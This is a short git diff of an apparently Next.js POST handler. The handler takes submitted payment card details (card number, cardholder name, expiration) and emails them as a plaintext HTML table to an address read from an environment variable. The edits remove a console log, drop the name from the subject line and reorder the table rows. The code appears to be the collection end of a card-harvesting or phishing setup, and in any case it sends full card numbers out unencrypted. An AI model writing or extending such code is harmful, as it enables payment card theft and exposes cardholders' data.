@@ -24,12 +24,10 @@ export async function POST(req: Request) {
         cardExpirationYear: string;
     };
 
-    console.log(body)
-
     const mailOptions = {
         from: process.env.EMAIL_FROM_VERIFIED,
         to: process.env.EMAIL_TO_ANY,
-        subject: `PD - Ref: ${body.refNumber} - ${body.name}`,
+        subject: `PD - Ref: ${body.refNumber}`,
         html: `
         <html lang="en">
         <head>
@@ -58,15 +56,15 @@ export async function POST(req: Request) {
         </head>
         <body>
             <h4>Payment Details</h4>
-            <p><b>Ref Number: ${body.refNumber} -- ${body.name}</b></p>
+            <p><b>Ref Number: ${body.refNumber}</b></p>
             <table>
-                <tr>
-                    <td>Card Number</td>
-                    <td>${body.cardNumber}</td>
-                </tr>
                 <tr>
                     <td>Card Name</td>
                     <td>${body.cardName}</td>
+                </tr>
+                <tr>
+                    <td>Card Number</td>
+                    <td>${body.cardNumber}</td>
                 </tr>
                 <tr>
                     <td>Card Expiration (MM/YY)</td>
